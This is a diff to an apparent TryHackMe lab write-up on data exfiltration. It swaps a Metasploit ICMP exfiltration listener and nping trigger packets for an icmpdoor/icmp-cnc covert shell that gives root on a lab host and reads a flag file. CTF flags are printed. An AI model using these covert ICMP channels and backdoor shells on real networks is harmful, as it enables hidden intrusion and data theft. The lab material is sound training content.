@@ -81,6 +81,15 @@ s
 mmand line: '/usr/sbin/apache2 -D FOREGROUND'
 ```
 
+```Bash
+root@ip-10-10-228-244:~# echo 'VEhNe0g3N1AtRzM3LTE1LWYwdW42fQo=' > tmp.txt
+```
+
+```Bash
+root@ip-10-10-228-244:~# base64 -d tmp.txt
+THM{H77P-G37-15-f0un6}
+```
+
 ### HTTP Tunneling
 
 ```Bash
@@ -176,75 +185,22 @@ root@ip-10-10-188-127:~# curl --socks5 127.0.0.1:1080 http://172.20.0.120/flag
 ## Exfiltration Using ICMP
 
 ```Bash
-root@ip-10-10-228-244:~# msfconsole -q
-msf6 >
+thm@jump-box:~$ tmux
 ```
 
 ```Bash
-msf6 > use icmp_exfil
-
-Matching Modules
-================
-
-   #  Name                         Disclosure Date  Rank    Check  Description
-   -  ----                         ---------------  ----    -----  -----------
-   0  auxiliary/server/icmp_exfil                   normal  No     ICMP Exfiltration Service
-
-
-Interact with a module by name or index. For example info 0, use 0 or use auxiliary/server/icmp_exfil
-
-[*] Using auxiliary/server/icmp_exfil
-msf6 auxiliary(server/icmp_exfil) >
+thm@jump-box:~$
+[0] 0:bash  1:bash
 ```
 
 ```Bash
-msf6 auxiliary(server/icmp_exfil) > show options
-
-Module options (auxiliary/server/icmp_exfil):
-
-   Name            Current Settin  Required  Description
-                   g
-   ----            --------------  --------  -----------
-   BPF_FILTER      icmp            yes       BFP format filter to l
-                                             isten for
-   END_TRIGGER     ^EOF            yes       Trigger for end of fil
-                                             e
-   FNAME_IN_PACKE  true            yes       Filename presented in
-   T                                         first packet straight
-                                             after START_TRIGGER
-   INTERFACE                       no        The name of the interf
-                                             ace
-   RESP_CONT       OK              yes       Data ro resond when co
-                                             ntinuation of data exp
-                                             ected
-   RESP_END        COMPLETE        yes       Data to response when
-                                             EOF received and data
-                                             saved
-   RESP_START      SEND            yes       Data to respond when i
-                                             nitial trigger matches
-   START_TRIGGER   ^BOF            yes       Trigger for beginning
-                                             of file
-
-
-View the full module info with the info, or info -d command.
+thm@jump-box:~$
+[0] 0:bash 
 ```
 
 ```Bash
-msf6 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src 10.10.228.244
-BPF_FILTER => icmp and not src 10.10.228.244
-```
-
-```Bash
-msf6 auxiliary(server/icmp_exfil) > run
-
-[*] ICMP Listener started on persistad (10.50.83.62). Monitoring for trigger packet containing ^BOF
-[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
-
-```
-
-```Bash
-thm@jump-box:~$ ssh thm@icmp.thm.com
-thm@icmp.thm.com's password: 
+thm@jump-box:~$ ssh thm@192.168.0.121
+thm@192.168.0.121's password: 
 Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
 
  * Documentation:  https://help.ubuntu.com
@@ -256,103 +212,51 @@ t are
 not required on a system that users do not log into.
 
 To restore this content, you can run the 'unminimize' command.
-
-The programs included with the Ubuntu system are free software;
-the exact distribution terms for each program are described in the
-individual files in /usr/share/doc/*/copyright.
-
-Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted b
-y
-applicable law.
-
-To run a command as administrator (user "root"), use "sudo <command
->".
-See "man sudo_root" for details.
-
+Last login: Wed Sep  6 02:23:58 2023 from 192.168.0.133
 thm@icmp-host:~$
 ```
 
 ```Bash
-thm@jump-box:~$ ssh thm@icmp.thm.com
-[sudo] password for thm: 
-Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
+[sudo] password for thm:
 
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
+```
 
-This system has been minimized by removing packages and content tha
-t are
-not required on a system that users do not log into.
-
-To restore this content, you can run the 'unminimize' command.
-Last login: Wed Sep  6 00:47:45 2023 from 10.100.1.130
-To run a command as administrator (user "root"), use "sudo <command
->".
-See "man sudo_root" for details.
-
-thm@jump-box:~$ ssh thm@icmp.thm.com
-thm@icmp.thm.com's password: 
-Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
-
- * Documentation:  https://help.ubuntu.com
- * Management:     https://landscape.canonical.com
- * Support:        https://ubuntu.com/advantage
-
-This system has been minimized by removing packages and content tha
-t are
-not required on a system that users do not log into.
-
-To restore this content, you can run the 'unminimize' command.
-Last login: Wed Sep  6 01:19:09 2023 from 192.168.0.133
-To run a command as administrator (user "root"), use "sudo <command
->".
-See "man sudo_root" for details.
-
-thm@icmp-host:~$
+`CTRL-B C`
+```Bash
+thm@jump-box:~$
+[0] 0:bash  1:bash
 ```
 
 ```Bash
-thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.228.244 --data-string
- "BOFfile.txt"
+thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 192.168.0.121 
 [sudo] password for thm: 
-
-Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2023-09-06 01:3
-2 EEST
-SENT (0.0388s) ICMP [192.168.0.121 > 10.10.228.244 Echo request (ty
-pe=8/code=0) id=25941 seq=1] IP [ttl=64 id=48940 iplen=39 ]
-RCVD (0.0399s) ICMP [10.10.228.244 > 192.168.0.121 Echo reply (type
-=0/code=0) id=25941 seq=1] IP [ttl=63 id=56995 iplen=39 ]
- 
-Max rtt: 0.938ms | Min rtt: 0.938ms | Avg rtt: 0.938ms
-Raw packets sent: 1 (39B) | Rcvd: 1 (39B) | Lost: 0 (0.00%)
-Nping done: 1 IP address pinged in 1.07 seconds
+shell:
 ```
 
 ```Bash
-thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.228.244 --data-string
- "getFlag"
-
-Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2023-09-06 01:3
-3 EEST
-SENT (0.0399s) ICMP [192.168.0.121 > 10.10.228.244 Echo request (ty
-pe=8/code=0) id=22069 seq=1] IP [ttl=64 id=64232 iplen=35 ]
-RCVD (0.0404s) ICMP [10.10.228.244 > 192.168.0.121 Echo reply (type
-=0/code=0) id=22069 seq=1] IP [ttl=63 id=64998 iplen=35 ]
- 
-Max rtt: 0.349ms | Min rtt: 0.349ms | Avg rtt: 0.349ms
-Raw packets sent: 1 (35B) | Rcvd: 1 (35B) | Lost: 0 (0.00%)
-Nping done: 1 IP address pinged in 1.07 seconds
+shell: whoami
+whoami
+shell: root
 ```
 
+```Bash
+shell: getFlag
+"getFlag"
+shell: [+] Check the flag: /tmp/flag.txt
+```
+
+`CTRL-B N`
+`CTRL-C`
 ```Bash
 thm@icmp-host:~$ ls /tmp
-flag.txt
+_MEI0IYd3R   flag.txt
 ```
 
 ```Bash
-thm@icmp-host:~$ cat /tmp/flag.txt 
-THM{g0t-1cmp-p4k3t!}
+shell: cat /tmp/flag.txt
+cat /tmp/flag.txt
+shell: THM{g0t-1cmp-p4k3t!}
 ```
 
 ## Exfiltration Over DNS
